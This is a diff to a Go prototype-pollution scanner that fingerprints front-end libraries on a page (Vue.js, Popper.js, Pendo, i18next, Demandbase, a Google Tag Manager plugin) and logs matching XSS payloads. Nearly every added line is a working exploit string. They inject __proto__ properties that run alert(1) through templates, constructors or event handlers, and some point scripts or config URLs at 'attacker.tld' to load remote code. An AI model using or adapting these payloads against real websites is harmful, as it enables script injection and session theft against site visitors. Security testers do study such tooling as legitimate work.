@@ -59,6 +59,18 @@ var fingerprint string = `(() => {
     gadgets = 'Wistia Embedded Video ';
   } else if (typeof $ !== 'undefined' && typeof $.zepto !== 'undefined') {
     gadgets = 'Zepto.js ';
+  } else if (typeof Vue != 'undefined') {
+    gadgets = "Vue.js";
+  } else if (typeof Popper !== 'undefined') {
+    gadgets = "Popper.js";
+  } else if (typeof pendo !== 'undefined') {
+    gadgets = "Pendo Agent";
+  } else if (typeof i18next !== 'undefined') {
+    gadgets = "i18next";
+  } else if (typeof Demandbase != 'undefined') {
+    gadgets = "Demandbase Tag";
+  } else if (typeof _analytics !== 'undefined' && typeof analyticsGtagManager !== 'undefined') {
+    gadgets = "Google Tag Manager plugin for analytics";
   }
 
  return gadgets;
@@ -67,7 +79,7 @@ var fingerprint string = `(() => {
 
 func main() {
     fmt.Printf(`                                                                                 
-    dMMMMb  dMMMMb  dMMMMMMMMb  .aMMMb  dMMMMb     v1.1.0
+    dMMMMb  dMMMMb  dMMMMMMMMb  .aMMMb  dMMMMb     v1.1.2
    dMP.dMP dMP.dMP dMP"dMP"dMP dMP"dMP dMP.dMP 
   dMMMMP" dMMMMP" dMP dMP dMP dMMMMMP dMMMMP"  
  dMP     dMP     dMP dMP dMP dMP dMP dMP           
@@ -217,6 +229,30 @@ dMP     dMP     dMP dMP dMP dMP dMP dMP            @kleiton0x7e
                log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[innerHTML]=<img/src/onerror=alert(1)>")
             } else if strings.Contains(string(res1), "Zepto.js") {
                log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[onerror]=alert(1)")
+            } else if strings.Contains(string(res1), "Vue.js") {
+               log.Printf(Info + " Displaying all possible payloads")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[v-if]=_c.constructor('alert(1)')()")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[attrs][0][name]=src&__proto__[attrs][0][value]=xxx&__proto__[xxx]=data:,alert(1)//&__proto__[is]=script")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[v-bind:class]=''.constructor.constructor('alert(1)')()")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[data]=a&__proto__[template][nodeType]=a&__proto__[template][innerHTML]=<script>alert(1)</script>")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + `__proto__[props][][value]=a&__proto__[name]=":''.constructor.constructor('alert(1)')(),"")`)
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[template]=<script>alert(1)</script>")
+            } else if strings.Contains(string(res1), "Popper.js") {
+               log.Printf(Info + " Displaying all possible payloads")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[arrow][style]=color:red;transition:all%%201s&__proto__[arrow][ontransitionend]=alert(1)")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[reference][style]=color:red;transition:all%%201s&__proto__[reference][ontransitionend]=alert(2)")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[popper][style]=color:red;transition:all%%201s&__proto__[popper][ontransitionend]=alert(3)")
+            } else if strings.Contains(string(res1), "Pendo Agent") {
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[dataHost]=attacker.tld/js.js%23")
+            } else if strings.Contains(string(res1), "i18next") {
+               log.Printf(Info + " Displaying all possible payloads")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[lng]=cimode&__proto__[appendNamespaceToCIMode]=x&__proto__[nsSeparator]=<img/src/onerror%%3dalert(1)>")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[lng]=a&__proto__[a]=b&__proto__[obj]=c&__proto__[k]=d&__proto__[d]=<img/src/onerror%%3dalert(1)>")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[lng]=a&__proto__[key]=<img/src/onerror%%3dalert(1)>")
+            } else if strings.Contains(string(res1), "Demandbase Tag") {
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[Config][SiteOptimization][enabled]=1&__proto__[Config][SiteOptimization][recommendationApiURL]=//attacker.tld/json_cors.php?")
+            } else if strings.Contains(string(res1), "Google Tag Manager plugin for analytics") {
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[customScriptSrc]=//attacker.tld/xss.js")  
             } else {
                log.Printf(Error + " An unexcepted error occured")
             }
